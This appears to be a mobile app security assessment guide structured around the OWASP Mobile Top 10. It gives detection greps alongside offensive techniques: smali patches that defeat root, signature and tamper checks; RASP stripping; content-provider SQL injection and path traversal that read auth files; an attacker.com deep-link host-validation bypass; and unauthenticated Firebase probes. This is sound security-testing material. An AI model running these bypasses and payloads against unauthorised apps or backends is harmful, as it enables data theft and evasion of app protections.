# OWASP Mobile Top 10 Analysis Guide

Complete analysis guide covering all OWASP Mobile Top 10 categories (2024), with specific tools, commands, search patterns, and verification steps for each category. Includes supplementary techniques for Smali patching, RASP bypass, deep link exploitation, content provider exploitation, and Firebase security auditing.

**Cross-references:** Each category is mapped to OWASP MASTG test cases and MITRE ATT&CK Mobile techniques. See `docs/references/mastg-mapping.md` for full MASTG test coverage and `docs/references/mitre-attack-mapping.md` for MITRE ATT&CK coverage matrix.

---

## M1: Improper Credential Usage

> **MASVS:** STORAGE, CRYPTO | **MASTG:** TEST-0001, 0207, 0212, 0287, 0304, 0305, 0306 | **MITRE:** T1634 Credentials from Password Store, T1409 Stored Application Data

### What to Check

- Hardcoded API keys, passwords, tokens in source code or resources
- Credentials stored in SharedPreferences/SQLite without encryption
- API keys with excessive permissions (e.g., admin keys shipped in client)
- OAuth client secrets embedded in the app

### How to Check

```bash
# Automated secret scanning (two-tool approach for comprehensive coverage)
apkleaks -f workspace/samples/base.apk --json -o workspace/reports/secrets.json
trufflehog filesystem workspace/output/<pkg>/ --json

# Manual search for credentials
grep -rnE 'password|passwd|secret|api_key|apikey|private_key|client_secret|token' workspace/output/<pkg>/
grep -rnE '(password|secret|api_key|token)\s*=\s*"[^"]{4,}"' workspace/output/<pkg>/

# Specific API key patterns
grep -rnE 'AIza[0-9A-Za-z\-_]{35}' workspace/output/<pkg>/          # Google API
grep -rnE 'AKIA[0-9A-Z]{16}' workspace/output/<pkg>/                 # AWS Access Key
grep -rnE 'sk_live_[a-zA-Z0-9]{24,}' workspace/output/<pkg>/         # Stripe

# Firebase config
grep -rnE 'firebase|firebaseio\.com|google-services\.json' workspace/output/<pkg>/

# Connection strings
grep -rnE 'mongodb://|postgres://|mysql://|redis://|amqp://|jdbc:' workspace/output/<pkg>/

# Runtime credential capture
frida -U -f <pkg> -l workspace/frida-scripts/crypto-tracer.js       # Capture keys at runtime
frida -U -f <pkg> -l workspace/frida-scripts/shared-prefs-monitor.js # Monitor credential storage
```

### Verification

- Extract discovered key and test its scope with API calls
- Check if trufflehog marks the credential as "verified" (live/active)
- Test if the key grants more access than the app needs

### Risk Rating

- **Critical**: Live admin/service account keys, database connection strings with write access
- **High**: API keys with excessive permissions, hardcoded OAuth secrets
- **Medium**: API keys with read-only access, expired but previously valid credentials
- **Low**: Development/staging keys that don't work in production

---

## M2: Inadequate Supply Chain Security

> **MASVS:** CODE | **MASTG:** TEST-0042, 0272, 0274 | **MITRE:** T1474 Supply Chain Compromise, T1661 Application Versioning

### What to Check

- Outdated libraries with known CVEs
- Third-party SDKs with excessive data collection
- Untrusted or compromised dependencies

### How to Check

```bash
# Check library versions in Gradle files
grep -rnE 'implementation|compile|api\s' workspace/output/<pkg>/ | grep -E '\d+\.\d+\.\d+'

# Check for known vulnerable libraries
grep -rnE 'okhttp.*3\.[0-9]\.|retrofit.*2\.[0-3]\.|gson.*2\.[0-7]\.' workspace/output/<pkg>/

# List all third-party SDKs by package name
grep -rnE 'import (com\.facebook|com\.google\.firebase|com\.crashlytics|com\.appsflyer|com\.adjust|io\.branch)' workspace/output/<pkg>/

# Check for tracking/analytics SDKs
grep -rnE 'analytics|tracking|telemetry|crashlytics|appsflyer|adjust\.com|branch\.io|mixpanel|amplitude' workspace/output/<pkg>/
```

### Verification

- Cross-reference discovered library versions against CVE databases (NVD, Snyk, GitHub Advisory)
- Check if vulnerable code paths are actually reachable in the app

### Risk Rating

- **Critical**: Known RCE vulnerability in an actively used library
- **High**: Known data exfiltration in a bundled SDK
- **Medium**: Outdated library with known but low-impact vulnerability
- **Low**: Slightly outdated library with no known exploits

---

## M3: Insecure Authentication/Authorization

> **MASVS:** AUTH, NETWORK | **MASTG:** TEST-0017, 0018, 0022, 0326–0330 | **MITRE:** T1635 Steal Application Access Token, T1417 Input Capture

### What to Check

- Client-side auth checks without server-side validation
- Weak session management (predictable tokens, no expiry)
- Missing certificate pinning
- Broken access control (e.g., incrementing user IDs)

### How to Check

```bash
# Auth-related code
grep -rnE 'Bearer|Authorization|X-API-Key|access_token|refresh_token|id_token|OAuth' workspace/output/<pkg>/
grep -rnE 'JWT|eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+' workspace/output/<pkg>/

# Session management
grep -rnE 'SessionManager|session_id|setSession|getSession' workspace/output/<pkg>/

# Certificate pinning configuration
grep -rnE 'CertificatePinner|network_security_config|TrustManager|SSLSocketFactory' workspace/output/<pkg>/

# Dynamic analysis: intercept traffic
frida -U -f <pkg> \
  -l workspace/frida-scripts/ssl-bypass.js \
  -l workspace/frida-scripts/http-logger.js \
  -l workspace/frida-scripts/api-tracer.js
```

### Verification

- Intercept auth tokens and test access control by modifying user IDs in requests
- Check if expired tokens are still accepted
- Test if client-side checks can be bypassed (use objection to force return values)
- Attempt to access other users' data by changing resource identifiers

### Risk Rating

- **Critical**: No server-side validation, IDOR with PII access
- **High**: Weak session management, no token expiry, missing pinning on auth endpoints
- **Medium**: Predictable but rotating tokens, basic pinning only
- **Low**: Minor session fixation risk, informational auth header exposure

---

## M4: Insufficient Input/Output Validation

> **MASVS:** CODE, PLATFORM | **MASTG:** TEST-0025, 0027, 0029, 0031, 0033 | **MITRE:** T1516 Input Injection, T1638 Adversary-in-the-Middle

### What to Check

- SQL injection via Content Providers
- JavaScript injection via WebView
- Path traversal in file operations
- Command injection via Runtime.exec

### How to Check

```bash
# Content Providers (SQL injection target)
grep -rnE 'ContentProvider|content://' workspace/output/<pkg>/
adb shell content query --uri content://<authority>/users --where "1=1) OR 1=1--"

# WebView JavaScript injection
grep -rnE 'setJavaScriptEnabled|addJavascriptInterface|evaluateJavascript' workspace/output/<pkg>/
grep -rnE 'loadUrl\(.*get\|intent\|extra\|param\|query\|uri' workspace/output/<pkg>/

# Path traversal in file operations
grep -rnE 'openFileOutput|openFileInput|getExternalStorage|new File\(' workspace/output/<pkg>/
adb shell content read --uri "content://<authority>/../../../../etc/hosts"

# Command injection
grep -rnE 'Runtime\.getRuntime\(\)\.exec|ProcessBuilder' workspace/output/<pkg>/
```

### Verification

- Test Content Provider URIs with SQL injection payloads
- Test WebView URLs with JavaScript payloads
- Test file operations with path traversal sequences
- Check if user input is sanitized before reaching dangerous operations

### Risk Rating

- **Critical**: SQL injection in exported Content Provider, RCE via command injection
- **High**: JavaScript injection in WebView with bridge access, path traversal to internal files
- **Medium**: Limited injection in non-exported component, filtered but incomplete sanitization
- **Low**: Input validation issues that don't lead to exploitable conditions

---

## M5: Insecure Communication

> **MASVS:** NETWORK | **MASTG:** TEST-0019–0023, 0217–0218, 0233–0244, 0282–0286, 0295 | **MITRE:** T1521 Encrypted Channel, T1632 Subvert Trust Controls, T1638 Adversary-in-the-Middle

### What to Check

- HTTP cleartext traffic allowed
- Custom TrustManagers that accept all certificates
- Missing or weak certificate pinning
- Sensitive data sent over unencrypted channels

### How to Check

```bash
# Network security config
grep -rnE 'network_security_config|cleartextTrafficPermitted|usesCleartextTraffic' workspace/output/<pkg>/

# Check manifest for cleartext flag
grep -rnE 'android:usesCleartextTraffic' workspace/output/<pkg>/AndroidManifest.xml

# Weak TLS configuration
grep -rnE 'checkServerTrusted.*\{\s*\}' workspace/output/<pkg>/    # Empty trust manager
grep -rnE 'onReceivedSslError.*proceed' workspace/output/<pkg>/     # WebView SSL bypass
grep -rnE 'ALLOW_ALL_HOSTNAME_VERIFIER|hostnameVerifier' workspace/output/<pkg>/
grep -rnE 'X509TrustManager|HostnameVerifier|SSLSocketFactory' workspace/output/<pkg>/

# Certificate pinning
grep -rnE 'CertificatePinner|network_security_config|pin-set' workspace/output/<pkg>/

# Dynamic traffic interception
frida -U -f <pkg> \
  -l workspace/frida-scripts/ssl-bypass.js \
  -l workspace/frida-scripts/http-logger.js
```

### Verification

- Set up proxy (mitmproxy/Burp) and check if traffic is interceptable
- Test if cleartext HTTP is used for any sensitive operations
- Check if certificate pinning can be bypassed with ssl-bypass.js alone
- Look for PII, tokens, and credentials in intercepted traffic

### Risk Rating

- **Critical**: Empty TrustManager (accepts all certs), sensitive data over HTTP
- **High**: No certificate pinning on auth/payment endpoints, cleartext traffic allowed
- **Medium**: Weak pinning (SHA-1 only), cleartext allowed but not used for sensitive data
- **Low**: Missing pinning on non-sensitive endpoints

---

## M6: Inadequate Privacy Controls

> **MASVS:** PRIVACY | **MASTG:** TEST-0003–0005, 0206, 0254–0257, 0318–0319 | **MITRE:** T1430 Location Tracking, T1636 Protected User Data, T1429 Audio Capture

### What to Check

- PII sent to analytics without user consent
- Excessive data in logs
- Device identifiers collected unnecessarily
- Tracking SDKs with broad data access

### How to Check

```bash
# Logging that may leak data
grep -rnE 'Log\.d|Log\.e|Log\.i|Log\.v|Log\.w|System\.out\.print' workspace/output/<pkg>/

# Device identifier collection
grep -rnE 'getDeviceId|ANDROID_ID|getSimSerialNumber|getSubscriberId|getMacAddress' workspace/output/<pkg>/

# Analytics and tracking SDKs
grep -rnE 'analytics|tracking|Firebase\.Analytics|Crashlytics|AppsFlyer|Adjust|Branch' workspace/output/<pkg>/

# Runtime log monitoring for PII
adb logcat --pid=$(adb shell pidof <pkg>) | \
  grep -iE "token|bearer|password|session|eyJ[A-Za-z0-9]|api[_-]key|secret|auth|email|phone|name|address"

# Traffic monitoring for PII
frida -U -f <pkg> \
  -l workspace/frida-scripts/ssl-bypass.js \
  -l workspace/frida-scripts/http-logger.js
# Then look for PII in request/response bodies
```

### Verification

- Monitor logcat for sensitive data exposure during normal app use
- Intercept traffic and check what data is sent to analytics endpoints
- Check if tracking can be opted out of

### Risk Rating

- **Critical**: PII sent to third parties without consent, credentials in logs
- **High**: Excessive device identifier collection, location tracking without clear purpose
- **Medium**: Debug logging with user data in release builds
- **Low**: Non-sensitive analytics data collection

---

## M7: Insufficient Binary Protections

> **MASVS:** RESILIENCE | **MASTG:** TEST-0038–0051, 0222–0227, 0288, 0324–0325 | **MITRE:** T1406 Obfuscated Files, T1407 Download New Code at Runtime, T1629 Impair Defenses, T1633 Virtualization/Sandbox Evasion

### What to Check

- Debuggable flag set in production
- No code obfuscation
- No root/emulator detection
- No integrity checks
- Play Integrity API implementation

### How to Check

```bash
# Check manifest flags
grep -rnE 'android:debuggable' workspace/output/<pkg>/AndroidManifest.xml

# APKiD protection detection (critical first step)
apkid workspace/samples/base.apk

# Check for obfuscation
# If classes have meaningful names -> no obfuscation
ls workspace/output/<pkg>/sources/com/

# Root detection
grep -rnE 'su|/system/xbin/su|isRooted|RootBeer|rootCheck|SafetyNet' workspace/output/<pkg>/
grep -rnE 'com\.scottyab\.rootbeer|com\.topjohnwu\.magisk' workspace/output/<pkg>/

# Emulator detection
grep -rnE 'Build\.FINGERPRINT|Build\.MODEL|goldfish|sdk_gphone|generic' workspace/output/<pkg>/

# Integrity checks
grep -rnE 'checkSignature|PackageInfo\.signatures|apkDigest' workspace/output/<pkg>/

# Play Integrity
grep -rnE 'PlayIntegrity|IntegrityManager|integrity' workspace/output/<pkg>/

# Frida detection
grep -rnE 'frida|xposed|substrate|/proc/self/maps|tcp.*27042' workspace/output/<pkg>/
```

### Verification

- Try debugging with `adb shell run-as <pkg>` (only works if debuggable)
- Test root bypass with `root-bypass.js`
- Test Frida detection bypass with `anti-frida-bypass.js`
- Attempt to repackage and install the APK

### Risk Rating

- **Critical**: Debuggable in production, no protections at all
- **High**: No obfuscation, no root detection, no integrity checks
- **Medium**: Basic protections only (ProGuard but no root detection)
- **Low**: All protections present but some bypassed with standard tools

**Note on Play Integrity:**
- DEVICE verdict is bypassable with PlayIntegrityFix (Magisk module)
- STRONG verdict requires functioning TEE and is significantly harder to bypass

---

## M8: Security Misconfiguration

> **MASVS:** PLATFORM | **MASTG:** TEST-0007, 0008, 0010, 0024, 0028–0033, 0035, 0037, 0250–0253, 0258, 0289–0294, 0315–0316, 0320 | **MITRE:** T1624 Event Triggered Execution, T1660 Phishing (deep links)

### What to Check

- Exported components without permission requirements
- Backup allowed (`android:allowBackup="true"`)
- Cleartext traffic permitted
- Debug mode in production
- Overly permissive FileProvider paths

### How to Check

```bash
# Exported components without permissions
grep -rnE 'exported="true"' workspace/output/<pkg>/AndroidManifest.xml
grep -rnE 'android:permission=' workspace/output/<pkg>/AndroidManifest.xml

# Backup flag
grep -rnE 'android:allowBackup' workspace/output/<pkg>/AndroidManifest.xml

# Debug mode
grep -rnE 'android:debuggable' workspace/output/<pkg>/AndroidManifest.xml

# Cleartext
grep -rnE 'android:usesCleartextTraffic|cleartextTrafficPermitted' workspace/output/<pkg>/

# FileProvider paths (check for overly permissive configuration)
grep -rnE 'root-path|files-path|cache-path|external-path' workspace/output/<pkg>/res/xml/

# Test exported activities
adb shell dumpsys package <pkg> | grep -A5 "Activity\|Service\|Receiver\|Provider"
adb shell am start -n <pkg>/<exported_activity>

# Test Content Providers
adb shell dumpsys activity providers | grep -B2 "<pkg>"
adb shell content query --uri content://<authority>/
```

### Verification

- Launch every exported activity and check for unauthorized access
- Query every exported Content Provider for data exposure
- Attempt backup and inspect backup contents
- Test FileProvider path traversal

### Risk Rating

- **Critical**: Exported activity bypasses auth, FileProvider root-path grants filesystem access
- **High**: Exported Content Provider leaks user data, backup contains credentials
- **Medium**: Exported components with limited data exposure, cleartext allowed
- **Low**: Non-sensitive exported components, backup with no sensitive data

---

## M9: Insecure Data Storage

> **MASVS:** STORAGE | **MASTG:** TEST-0001, 0006, 0009, 0011, 0012, 0200–0203, 0207, 0216, 0231, 0262, 0287, 0304–0306 | **MITRE:** T1409 Stored Application Data, T1533 Data from Local System, T1532 Archive Collected Data

### What to Check

- Plaintext credentials in SharedPreferences
- Unencrypted SQLite databases with sensitive data
- Sensitive files on external storage (world-readable)
- Cleartext data in app cache
- Android Keystore usage (or lack thereof)

### How to Check

```bash
# Check SharedPreferences content (requires debuggable or root)
adb shell run-as <pkg> ls /data/data/<pkg>/shared_prefs/
adb shell run-as <pkg> cat /data/data/<pkg>/shared_prefs/<file>.xml

# Check SQLite databases
adb shell run-as <pkg> ls /data/data/<pkg>/databases/
adb shell run-as <pkg> sqlite3 /data/data/<pkg>/databases/<db> ".tables"
adb shell run-as <pkg> sqlite3 /data/data/<pkg>/databases/<db> "SELECT * FROM <table> LIMIT 5"

# Check files on external storage
adb shell ls /sdcard/Android/data/<pkg>/
adb shell ls /sdcard/Download/ | grep -i <pkg>

# Check app internal storage
adb shell run-as <pkg> ls /data/data/<pkg>/files/
adb shell run-as <pkg> ls /data/data/<pkg>/cache/

# Check for Android Keystore usage in code
grep -rnE 'KeyStore\.getInstance|AndroidKeyStore|setKeyEntry' workspace/output/<pkg>/
grep -rnE 'EncryptedSharedPreferences|MasterKey|MasterKeys' workspace/output/<pkg>/

# Monitor storage operations at runtime
frida -U -f <pkg> -l workspace/frida-scripts/shared-prefs-monitor.js
```

### Verification

- Pull all SharedPreferences files and check for plaintext credentials, tokens, PII
- Inspect SQLite databases for sensitive data
- Check if external storage files contain sensitive information
- Verify whether Android Keystore is used for key material

### Risk Rating

- **Critical**: Plaintext passwords/tokens in SharedPreferences, unencrypted database with PII
- **High**: Session tokens in cleartext, sensitive data on external storage
- **Medium**: Non-critical data stored unencrypted, cache with limited sensitive info
- **Low**: Encrypted storage with minor implementation concerns

---

## M10: Insufficient Cryptography

> **MASVS:** CRYPTO | **MASTG:** TEST-0013–0016, 0204–0205, 0208, 0212, 0221, 0232, 0307–0310, 0312 | **MITRE:** T1521 Encrypted Channel, T1406 Obfuscated Files or Information

### What to Check

- ECB mode usage (patterns visible in ciphertext)
- DES, 3DES (weak, deprecated)
- MD5/SHA1 for security purposes (not just checksums)
- Hardcoded encryption keys and IVs
- java.util.Random for cryptographic purposes

### How to Check

```bash
# Weak algorithms
grep -rnE 'ECB|DES|DESede|RC4|MD5|SHA1(?![\d])|SHA-1' workspace/output/<pkg>/

# Specific crypto misuse
grep -rnE 'Cipher\.getInstance\("AES"\)' workspace/output/<pkg>/     # ECB default
grep -rnE 'IvParameterSpec\(.*new byte' workspace/output/<pkg>/       # Hardcoded IV
grep -rnE 'new Random\(\)' workspace/output/<pkg>/                    # Insecure RNG
grep -rnE 'SecretKeySpec\(.*".*"' workspace/output/<pkg>/             # Hardcoded key

# Key material patterns
grep -rnE 'SecretKeySpec|IvParameterSpec|PBEKeySpec|KeyGenerator' workspace/output/<pkg>/
grep -rnE 'AES/CBC/PKCS5|AES/ECB|DES/|Blowfish' workspace/output/<pkg>/

# Runtime crypto monitoring
frida -U -f <pkg> -l workspace/frida-scripts/crypto-tracer.js
```

### Verification

- Use crypto-tracer.js to capture actual keys and algorithms at runtime
- Check if hardcoded keys are the same across all installations
- Verify if weak algorithms are used for security-sensitive operations (not just checksums)
- Test if ECB mode produces visible patterns in encrypted data

### Risk Rating

- **Critical**: Hardcoded AES key used for encrypting credentials, ECB mode for sensitive data
- **High**: MD5/SHA1 for password hashing, java.util.Random for token generation
- **Medium**: Hardcoded IV with per-installation key, weak but not exploitable crypto
- **Low**: MD5 used for non-security checksums, deprecated but not exploitable algorithm

---

## Supplementary Techniques

### Smali Patching Reference

When Frida is fully blocked by RASP and repackaging is the only option, use these smali patterns:

**Return True (bypass any boolean check):**

```smali
.method public isSecurityCheckPassed()Z
    .locals 1
    const/4 v0, 0x1
    return v0
.end method
```

**Return False (disable a feature like root detection):**

```smali
.method public isRooted()Z
    .locals 1
    const/4 v0, 0x0
    return v0
.end method
```

**Kill a Method (disable telemetry, anti-tampering reports):**

```smali
.method public sendTamperReport(Ljava/lang/String;)V
    .locals 0
    return-void
.end method
```

**Inject Logging (trace obfuscated values at runtime):**

```smali
# Insert after the instruction that puts a value in v0:
const-string v1, "REVERSE"
invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
# Then: adb logcat -s REVERSE
```

**Signature Verification Bypass:**

```smali
# Find: method that checks PackageInfo.signatures
# Replace with always-true stub:
.method public validateAppSignature(Landroid/content/Context;)Z
    .locals 1
    const/4 v0, 0x1
    return v0
.end method
```

**Full Repackaging Workflow:**

```bash
# Decompile to smali
apktool d app.apk -o app_smali

# ... edit smali files ...

# Rebuild APK
apktool b app_smali -o patched.apk

# Align
zipalign -v 4 patched.apk patched-aligned.apk

# Sign
java -jar tools/uber-apk-signer/uber-apk-signer.jar -a patched-aligned.apk

# Install
adb install patched-aligned-debugSigned.apk
```

---

### RASP Bypass Methodology

#### Crash-and-Trace (Universal RASP Discovery)

When facing unknown commercial protection (DexGuard, Promon, Arxan):

1. **Strip the protection**: Remove the protector's `.so` files from the APK
2. **Repackage and install**: The app will crash
3. **Read logcat**: Stack trace reveals which Java methods called into the native protection
4. **Create stubs**: Modify smali to return safe values for those methods

```bash
# Step 1: Find protection libraries
unzip -l app.apk | grep -E '\.so$' | grep -vi 'flutter\|unity\|react'

# Step 2: Decompile
apktool d app.apk -o app_decoded

# Step 3: Delete suspected protection .so
rm app_decoded/lib/arm64-v8a/libprotection.so

# Step 4: Rebuild, sign, install -> read crash log
apktool b app_decoded -o patched.apk
java -jar tools/uber-apk-signer/uber-apk-signer.jar -a patched.apk
adb install patched-aligned-debugSigned.apk
adb logcat --pid=$(adb shell pidof <pkg>) | grep -i "exception\|error\|fatal"
```

#### Auth Transplant Attack

When white-box cryptography makes key extraction impossible:

1. Find another legitimate app using the same SDK/platform
2. Extract its encrypted config file
3. Inject into your modified app
4. If backend only validates key validity (not package binding), access is granted

---

### Deep Link and WebView Exploitation

#### Host Validation Bypass

Developers often use `url.getHost().endsWith("trusted.com")` which is trivially bypassed:

```bash
# endsWith("insecureshop.com") passes for attacker.com/?insecureshop.com
adb shell am start -W -a android.intent.action.VIEW \
  -d "insecureshop://com.insecureshop/webview?url=attacker.com/?insecureshop.com"
```

#### What to Check for Deep Links

- `android:scheme=` + `android:host=` in manifest — test with malicious URLs
- WebView `loadUrl()` with intent extras — can you inject arbitrary URL?
- JavaScript bridge (`addJavascriptInterface`) + controllable URL = full compromise
- `setAllowUniversalAccessFromFileURLs(true)` + `file://` scheme = local file theft

#### FileProvider Path Traversal

Critical misconfiguration pattern:

```xml
<!-- Dangerous: grants access to entire filesystem -->
<root-path name="root" path="/" />
```

Even with `android:exported="false"`, if `android:grantUriPermissions="true"`, a malicious app can request temporary URI permissions and traverse paths to read SharedPreferences, databases, internal files.

```bash
# Test FileProvider path traversal
adb shell content read \
  --uri "content://<authority>/root/data/data/<pkg>/shared_prefs/auth.xml"
```

---

### Content Provider Exploitation

```bash
# Discover providers
adb shell dumpsys activity providers | grep -B2 "com.target"

# Query with projection
adb shell content query --uri content://com.target.provider/users \
  --projection "_id:name:email"

# Path traversal test
adb shell content read \
  --uri "content://com.target.provider/../../../../etc/hosts"

# SQL injection test
adb shell content query --uri content://com.target.provider/users \
  --where "1=1) OR 1=1--"
```

---

### Firebase Security Rules Auditing

#### Extract Firebase Configuration

```bash
grep -rnE 'firebase|firebaseio\.com|databaseURL|storageBucket|projectId' workspace/output/<pkg>/
```

#### Test Unauthenticated Access

```bash
# Realtime Database — try reading root
curl https://<project-id>.firebaseio.com/.json

# Firestore — try reading a common collection
curl "https://firestore.googleapis.com/v1/projects/<project-id>/databases/(default)/documents/users"
```

#### Common Misconfigurations

| Rule | Risk |
|---|---|
| `allow read: if request.auth != null;` | **Dangerous**: any authenticated user from ANY Firebase project gets access |
| `allow read, write: if true;` | **Critical**: test mode (default for new projects!) — fully open |
| `allow read: if request.auth.uid == resource.data.userId;` | **Correct**: user-scoped access |

#### Firebase Monitoring at Runtime

Use `http-logger.js` to monitor Firebase API calls, or the Firebase-specific hook:

```js
var Ref = Java.use("com.google.firebase.database.DatabaseReference");
Ref.setValue.overload('java.lang.Object').implementation = function(val) {
    console.log("[Firebase] " + this.getPath() + " = " + val);
    return this.setValue(val);
};
```

---

### Transparent Proxy Setup (Rooted Device)

Redirect all app traffic without per-app proxy configuration:

```bash
# Redirect HTTPS and HTTP
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8443"
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8080"

# Force QUIC downgrade (makes HTTP/3 traffic interceptable)
adb shell su -c "iptables -A OUTPUT -p udp --dport 443 -j DROP"

# Clean up: replace -A with -D
adb shell su -c "iptables -t nat -D OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8443"
adb shell su -c "iptables -t nat -D OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8080"
```

---

## Analysis Workflow Summary

For a complete OWASP Mobile Top 10 assessment, follow this order:

1. **Recon**: `apkid <apk>` to identify protections, then `jadx -d output --deobf app.apk` for decompilation
2. **Manifest analysis** (M8): Check exported components, backup, cleartext, debug flags
3. **Secret scanning** (M1): Run apkleaks + trufflehog
4. **Code analysis** (M3, M4, M10): Search for auth patterns, input validation, crypto weaknesses
5. **Network analysis** (M5): Intercept traffic with ssl-bypass.js + http-logger.js
6. **Storage analysis** (M9): Pull SharedPrefs, databases, check external storage
7. **Privacy analysis** (M6): Monitor logcat and traffic for PII leakage
8. **Binary analysis** (M7): Check obfuscation, root detection, integrity checks
9. **Supply chain** (M2): Check library versions against CVE databases
10. **Deep testing**: Content Providers, deep links, WebView, Firebase
